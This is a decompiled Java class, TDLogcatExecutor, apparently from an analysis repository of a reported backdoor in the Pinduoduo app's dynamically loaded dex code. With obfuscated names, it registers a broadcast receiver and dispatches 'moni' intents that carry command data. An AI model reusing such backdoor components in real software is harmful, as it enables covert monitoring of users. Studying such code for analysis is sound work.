package com.google.android.sd.biz_dynamic_dex.td.logcat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.a.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a.a;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a.b;
import com.google.android.sd.biz_dynamic_dex.td.logcat.c.b.a.c;

public class TDLogcatExecutor extends DynamicCmdExecutor {
  private static void a(Context paramContext, String paramString, int paramInt) {
    b.a("send_intent_".concat(String.valueOf(paramInt)));
    Intent intent = new Intent("com.google.android.sd.moni.pro");
    intent.putExtra("extra_moni_intent_data", paramString);
    intent.putExtra("extra_moni_execute_type", paramInt);
    paramContext.sendBroadcast(intent);
  }
  
  public void preExecute(Context paramContext, String paramString) {
    if (c.b(paramString)) {
      b.a("support_pre_catch");
      a a = (new b(paramContext, c.a(paramString))).a();
      if (a != null)
        b.a = a; 
    } 
  }
  
  public void realExecute(Context paramContext, String paramString) {
    try {
      int i = a.a(paramString);
      if (i != 0) {
        if (i != 1) {
          if (i != 2) {
            b.a("unknown_type");
            return;
          } 
          a(paramContext, paramString, 2);
          a.b(paramContext, "4");
          return;
        } 
        a(paramContext, paramString, 1);
        return;
      } 
      b.a("register_producer");
      a a = new a(paramContext);
      IntentFilter intentFilter = new IntentFilter();
      intentFilter.addAction("com.google.android.sd.moni.pro");
      paramContext.registerReceiver((BroadcastReceiver)a, intentFilter);
      a(paramContext, paramString, 0);
      a.b(paramContext, "0");
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("real_execute_error_");
      stringBuilder.append(exception.getMessage());
      a.a(paramContext, stringBuilder.toString());
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\TDLogcatExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */